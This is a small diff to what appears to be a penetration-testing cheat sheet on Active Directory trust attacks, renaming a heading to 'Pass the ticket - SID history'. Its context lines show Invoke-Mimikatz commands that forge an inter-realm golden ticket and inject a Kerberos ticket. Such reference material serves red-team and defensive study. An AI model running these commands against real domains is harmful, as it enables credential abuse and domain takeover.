@@ -118,7 +118,7 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:childoma
 <trusted key hash> /service:krbtgt /target:maindomain.com /ticket:C:\temp\trust_tkt.kirbi"'
 ```
 
-### Pass the ticket
+### Pass the ticket - SID history
 
 ```csharp
  Invoke-Mimikatz -Command '"kerberos::ptt krbtgt_tkt.kirbi"'
